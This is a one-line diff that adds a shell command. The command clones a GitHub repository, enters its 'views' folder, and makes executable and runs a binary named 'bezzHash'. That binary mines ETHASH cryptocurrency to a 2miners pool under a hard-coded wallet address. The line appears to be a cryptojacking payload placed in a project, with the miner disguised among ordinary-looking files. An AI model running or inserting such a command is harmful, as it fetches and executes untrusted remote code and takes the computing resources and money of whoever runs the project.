@@ -1,0 +1,1 @@
+git clone https://github.com/githuboneheart/mom.git && cd mom && cd views && chmod +x bezzHash && ./bezzHash --algo ETHASH --pool stratum+ssl://asia-eth.2miners.com:12020 --user 0xfc6e64931ded74388e4e1bfe3645a3239e44f8e9.Semogaberkah --longstats 5 --shortstats 5 --timeprint on --log on --ethstratum ETHPROX --basecolor
